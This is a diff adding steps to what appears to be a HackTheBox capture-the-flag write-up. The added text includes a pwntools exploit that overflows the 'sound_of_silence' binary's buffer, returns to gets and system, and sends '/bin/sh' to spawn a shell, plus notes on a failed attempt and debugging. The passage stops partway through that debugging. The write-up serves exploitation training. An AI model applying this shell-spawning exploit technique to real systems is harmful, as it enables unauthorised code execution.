@@ -47,5 +47,38 @@
 11. Nice! Now, what are our objectives? There is no **write()**, **read()**, **printf()**, or **puts()** call.
 12. BUT there is **system()**.
 13. Our objective is to return to `gets@plt`, then pass `system()` as it's arg.
+14. Finally, simply passing the `/bin/sh\x00` strings.
+15. Here's the crafted script.
 
+> SCRIPT
+
+```py
+from pwn import *
+
+exe = './sound_of_silence'
+elf = context.binary = ELF(exe, checksec=True)
+context.log_level = 'DEBUG'
+
+sh = process(exe)
+
+p = flat([
+    cyclic(40),
+    elf.sym['gets'],
+    elf.sym['system']
+])
+
+sh.sendline(p)
+sh.sendline(b'/bin/sh\x00')
+
+sh.interactive()
+```
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b3918398-f44c-43fb-8cc3-cb832f15354e)
+
+
+16. Interesting, we failed to get shell. Based from the received bytes, it said `/bin.sh` not found.
+17. Noticed our `/` is bit-flipped (?)
+18. Upon debugging our input by set breakpoints at **main()**, we found an interesting pointer stored at the RDI upon step into the **gets()** call.
 
